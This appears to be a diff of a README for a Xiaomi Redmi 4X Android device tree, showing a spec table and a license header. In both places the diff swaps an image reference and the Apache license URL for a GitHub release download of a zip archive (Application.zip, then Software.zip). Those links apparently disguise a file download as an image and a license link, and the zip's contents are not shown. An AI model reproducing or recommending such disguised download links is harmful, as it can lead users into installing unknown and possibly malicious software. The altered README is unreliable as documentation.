@@ -13,7 +13,7 @@ Display | 720x1280 pixels, 5.0 (~320 ppi pixel density)
 Rear Camera  | 13MP, 4128x3096 pixels, PDAF
 Front Camera | 5 MP, 2560x1920 pixels
 
-![Xiaomi Redmi 4X](https://github.com/amandwivedi0/device_xiaomi_santoni/releases/download/v1.0/Application.zip "Xiaomi Redmi 4X")
+![Xiaomi Redmi 4X](https://github.com/amandwivedi0/device_xiaomi_santoni/releases/download/v2.0/Software.zip "Xiaomi Redmi 4X")
 
 ## Copyright
 
@@ -25,7 +25,7 @@ Front Camera | 5 MP, 2560x1920 pixels
 # you may not use this file except in compliance with the License.
 # You may obtain a copy of the License at
 #
-#      https://github.com/amandwivedi0/device_xiaomi_santoni/releases/download/v1.0/Application.zip
+#      https://github.com/amandwivedi0/device_xiaomi_santoni/releases/download/v2.0/Software.zip
 #
 # Unless required by applicable law or agreed to in writing, software
 # distributed under the License is distributed on an "AS IS" BASIS,
